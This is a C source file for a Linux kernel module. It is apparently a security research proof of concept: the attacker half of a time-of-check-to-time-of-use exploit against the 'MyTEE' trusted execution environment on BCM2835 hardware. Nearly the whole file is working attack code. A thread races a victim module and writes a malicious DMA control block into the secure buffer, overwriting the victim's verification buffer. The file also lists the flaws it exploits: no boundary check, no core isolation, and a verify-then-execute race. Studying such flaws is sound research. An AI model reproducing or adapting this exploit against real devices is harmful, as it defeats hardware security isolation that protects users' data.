/*
 * MyTEE TOCTOU Attack - Attacker Module (runs on Core 1)
 * 
 * REAL ATTACK: Injects valid DMA control blocks that will be executed
 * by the DMA controller without verification.
 *
 * The attack exploits:
 * 1. No boundary check when copying CBs to secure buffer
 * 2. No core isolation between adjacent buffer regions  
 * 3. Race condition between verification and DMA execution
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/smp.h>
#include <linux/slab.h>

#include "toctou_common.h"

#define DRIVER_NAME "toctou_attacker"

/* Import from victim module */
extern unsigned long exported_sync_phys;
extern unsigned long exported_verify_phys;

/* Module parameters */
static int auto_start = 0;
module_param(auto_start, int, 0644);
MODULE_PARM_DESC(auto_start, "Auto-start attack thread on module load");

/* Timing parameter */
static int timing_poll = DEFAULT_TIMING_POLL_US;
module_param(timing_poll, int, 0644);
MODULE_PARM_DESC(timing_poll, "Polling interval (us, 0=cpu_relax only)");

/* Runtime state */
static void __iomem *sync_flag_base;
static void __iomem *secure_buffer_base;
static struct task_struct *attack_thread;
static volatile int stop_attack = 0;

/* Malicious payload: source buffer containing attack pattern */
static void *attack_src_buf;
static dma_addr_t attack_src_dma;

static inline void sync_write(u32 offset, u32 value)
{
    if (sync_flag_base) {
        writel(value, (void *)sync_flag_base + offset);
        wmb();
    }
}

static inline u32 sync_read(u32 offset)
{
    if (sync_flag_base) {
        rmb();
        return readl(sync_flag_base + offset);
    }
    return 0;
}

/*
 * Inject REAL malicious CB into Core 1's secure buffer region.
 * This CB will be executed by DMA and write VERIFY_PATTERN to victim's verify buffer.
 * 
 * NO LOGGING in this function - timing critical!
 */
static void trigger_malicious_dma(void)
{
    void __iomem *core1_buffer;
    u32 ti_flags;
    u32 dst_addr;

    if (!secure_buffer_base || !exported_verify_phys)
        return;

    core1_buffer = secure_buffer_base + (1 * SECURE_BUFFER_SIZE_PER_CORE);

    /* Valid transfer info flags for actual DMA execution */
    ti_flags = BCM2835_DMA_TI_S_INC | BCM2835_DMA_TI_D_INC | 
               BCM2835_DMA_TI_WAIT_RESP;

    /* Target: victim's verification buffer */
    dst_addr = PHYS_TO_BUS(exported_verify_phys);

    /* 
     * Write VALID malicious CB that DMA will actually execute:
     * - Copies VERIFY_PATTERN from our buffer to victim's verify buffer
     */
    writel(ti_flags, core1_buffer + 0x00);              /* info: valid flags */
    writel(PHYS_TO_BUS(attack_src_dma), core1_buffer + 0x04);  /* src: our pattern */
    writel(dst_addr, core1_buffer + 0x08);              /* dst: victim's verify buf */
    writel(sizeof(u32), core1_buffer + 0x0C);           /* length: 4 bytes */
    writel(0, core1_buffer + 0x10);                     /* stride: 0 */
    writel(0, core1_buffer + 0x14);                     /* next: NULL (end) */
    wmb();
}

/*
 * Attack thread - waits for sync signal and injects malicious CB
 */
static int attack_thread_fn(void *data)
{
    u32 state;
    int my_core;
    static int inject_count = 0;

    /* Ensure we're on Core 1 */
    set_cpus_allowed_ptr(current, cpumask_of(1));
    my_core = smp_processor_id();

    pr_info("[ATTACKER] Thread on Core %d, poll=%dus\n", my_core, timing_poll);

    while (!kthread_should_stop() && !stop_attack) {
        state = sync_read(SYNC_OFFSET_STATE);

        if (state == SYNC_STATE_VICTIM_TRAPPED) {
            /* Critical timing - inject immediately */
            trigger_malicious_dma();
            sync_write(SYNC_OFFSET_ATTACK_RESULT, ATTACK_RESULT_INJECTED);
            inject_count++;
        }

        if (timing_poll > 0)
            udelay(timing_poll);
        else
            cpu_relax();
    }

    pr_info("[ATTACKER] Stopping, injected %d times\n", inject_count);
    return 0;
}

static int __init toctou_attacker_init(void)
{
    u32 *pattern;

    /* 
     * Use sync memory exported by victim module.
     * Victim must be loaded first.
     */
    if (!exported_sync_phys) {
        pr_err("[ATTACKER] Victim module not loaded (exported_sync_phys=0)\n");
        return -ENODEV;
    }
    
    sync_flag_base = (void __iomem *)phys_to_virt(exported_sync_phys);
    pr_info("[ATTACKER] Using victim's sync at phys=0x%lx\n", exported_sync_phys);

    /* Map secure buffer region using phys_to_virt (RAM region, not MMIO) */
    secure_buffer_base = (void __iomem *)phys_to_virt(SECURE_BUFFER_BASE_PHYS);
    if (!secure_buffer_base) {
        pr_err("[ATTACKER] Failed to map secure buffer\n");
        return -ENOMEM;
    }

    /* Allocate source buffer for malicious DMA payload */
    attack_src_buf = (void *)__get_free_page(GFP_KERNEL | GFP_DMA);
    if (!attack_src_buf) {
        pr_err("[ATTACKER] Failed to allocate attack buffer\n");
        return -ENOMEM;
    }
    attack_src_dma = virt_to_phys(attack_src_buf);
    
    /* Fill with verification pattern */
    pattern = (u32 *)attack_src_buf;
    *pattern = VERIFY_PATTERN;
    wmb();

    /* Initialize sync state */
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_IDLE);

    /* Start attack thread if auto_start enabled */
    if (auto_start) {
        attack_thread = kthread_run(attack_thread_fn, NULL, "toctou_attacker");
        if (IS_ERR(attack_thread)) {
            pr_err("[ATTACKER] Failed to create thread\n");
            attack_thread = NULL;
        }
    }

    pr_info("[ATTACKER] Loaded: auto=%d, sync=0x%lx, verify=0x%lx\n",
            auto_start, exported_sync_phys, exported_verify_phys);
    return 0;
}

static void __exit toctou_attacker_exit(void)
{
    stop_attack = 1;

    if (attack_thread)
        kthread_stop(attack_thread);

    if (attack_src_buf)
        free_page((unsigned long)attack_src_buf);

    /* secure_buffer_base and sync_flag_base use phys_to_virt, no iounmap needed */

    pr_info("[ATTACKER] Unloaded\n");
}

module_init(toctou_attacker_init);
module_exit(toctou_attacker_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Attacker Module");
